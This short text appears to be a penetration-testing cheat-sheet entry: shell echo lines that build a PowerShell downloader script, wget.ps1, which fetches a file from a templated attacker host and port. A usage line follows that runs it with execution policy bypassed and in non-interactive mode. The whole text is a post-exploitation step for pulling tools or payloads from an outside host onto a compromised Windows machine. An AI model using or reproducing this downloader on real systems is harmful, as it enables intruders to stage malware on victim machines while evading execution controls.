echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://{{ host.ip }}:{{ host.port }}/" + $args[0] >>wget.ps1
echo $file = "$storageDir/" + $args[1] >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1


Usage:
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

